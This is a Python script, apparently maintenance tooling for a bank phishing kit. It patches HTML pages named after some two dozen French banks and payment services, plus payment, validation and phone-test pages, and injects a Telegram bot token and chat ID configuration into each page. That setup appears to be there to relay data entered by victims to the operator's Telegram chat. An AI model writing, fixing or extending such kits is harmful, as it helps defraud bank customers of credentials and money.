import os
import re

# Fichiers à corriger
files_to_fix = [
    'banque-populaire.html',
    'banque-postale.html',
    'bcp.html',
    'bred.html',
    'caisse-epargne.html',
    'cooperatif.html',
    'credit-agricole.html',
    'dupuy.html',
    'fortuneo.html',
    'hello-bank.html',
    'maritime.html',
    'marze.html',
    'monabanq.html',
    'nickel.html',
    'palatine.html',
    'payment.html',
    'savoie.html',
    'societe-generale.html',
    'test-amount.html',
    'test-phone-debug.html',
    'test-phone.html',
    'validation.html',
    'wero.html'
]

telegram_script = '''    <script>
        window.telegramConfig = {
            BOT_TOKEN: "TELEGRAM_BOT_TOKEN_PLACEHOLDER",
            CHAT_ID: "TELEGRAM_CHAT_ID_PLACEHOLDER"
        };
    </script>'''

for filename in files_to_fix:
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # 1. Remove external script references
        content = re.sub(r'<script[^>]*src=["\']wait-config\.js["\'][^>]*></script>\n?', '', content)
        content = re.sub(r'<script[^>]*src=["\']init-telegram\.js["\'][^>]*></script>\n?', '', content)
        
        # 2. Check if window.telegramConfig is already there
        if 'window.telegramConfig' not in content:
            # Find the <head> tag
            head_match = re.search(r'<head[^>]*>', content)
            if head_match:
                # Insert after <head>
                pos = head_match.end()
                content = content[:pos] + '\n' + telegram_script + '\n' + content[pos:]
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(content)
        
        print(f"OK: {filename}")
    except Exception as e:
        print(f"ERROR: {filename}: {e}")

print("\nAll files fixed!")
